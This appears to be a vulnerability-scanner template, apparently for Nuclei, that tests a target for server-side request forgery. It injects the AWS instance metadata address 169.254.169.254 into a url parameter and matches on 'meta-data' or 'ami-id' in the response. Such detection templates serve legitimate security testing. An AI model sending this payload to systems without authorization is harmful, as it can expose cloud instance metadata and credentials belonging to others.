id: ssrf-metadata
info:
  name: SSRF - AWS Metadata Access
  severity: high

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
    matchers:
      - type: word
        words:
          - "meta-data"
          - "ami-id"
        part: body
